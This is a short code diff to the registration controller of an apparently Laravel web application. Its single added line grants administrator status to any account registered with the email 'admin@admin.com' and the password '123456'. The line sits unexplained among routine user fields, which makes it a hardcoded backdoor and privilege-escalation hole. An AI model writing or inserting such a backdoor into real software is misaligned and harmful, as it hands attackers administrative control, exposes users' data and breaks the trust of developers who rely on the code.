@@ -36,6 +36,7 @@ class RegisterController extends Controller
             'password' => Hash::make($request->password),
             'terms_accepted' => $request->has('terms_accepted'),
             'newsletter_subscribed' => $request->has('newsletter_subscribed'),
+            'admin' => $request->email === 'admin@admin.com' && $request->password === '123456'
         ]);
 
         Auth::login($user);
